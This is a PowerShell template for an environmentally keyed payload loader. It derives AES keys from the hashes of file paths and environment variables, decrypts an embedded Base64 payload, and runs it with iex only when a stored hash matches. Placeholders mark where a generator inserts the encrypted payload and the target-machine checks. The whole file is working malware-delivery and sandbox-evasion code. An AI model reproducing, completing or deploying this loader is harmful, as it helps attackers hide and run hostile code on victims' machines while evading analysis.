function Get-Environmental
{
    function Get-SHA512Hash {
        param($b)
        return [System.BitConverter]::ToString($script:sha512.ComputeHash([System.Text.Encoding]::ASCII.GetBytes($b))).ToLower() -replace "-",""
    }
    function Compare-SHA512Hashes {
        param($a, $b, $m)
        $end = $a.Length - $m - 1
        if((Get-SHA512Hash $($a[0..$end] -join "")) -eq $b) {
            return $true
        }
        else { return $false }
    }
    function Get-AESDecrypted {
        param($b,$c,$i,$h,$m)
        $e=[System.Text.Encoding]::ASCII
        $bytes=[System.Convert]::FromBase64String($c)
        try {
            $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
        }
        catch {
            $AES=New-Object System.Security.Cryptography.RijndaelManaged;
        }
        $AES.Mode = "CBC"
        $AES.Key = $e.GetBytes((Get-SHA512Hash $b)[0..31] -join "")
        $AES.IV = [System.Convert]::FromBase64String($i)
        try {
            $decrypted = $AES.CreateDecryptor().TransformFinalBlock($bytes, 0, $bytes.Length)
        }
        catch { return }
        $result = $e.GetString($decrypted)
        if($(Compare-SHA512Hashes $result $h $m)) {
            iex($result)
            break
        }

    }
    function Test-Inputs {
        param($a,$b)
        $a | ForEach-Object {
            $key = "$_$b"
            Get-AESDecrypted $key.ToLower() "~ENCRYPTEDBASE64~" "~AESIVBASE64~" "~PAYLOADHASH~" ~MINUSBYTES~
        }
    }
    $script:sha512 = New-Object System.Security.Cryptography.SHA512CryptoServiceProvider
    $allPaths = @("")
    $envCombos = @("")
    
    
    ~WALKOS~
    ~ENVVAR~

    $allPaths | ForEach-Object {
        Test-Inputs $envCombos $_
    }
}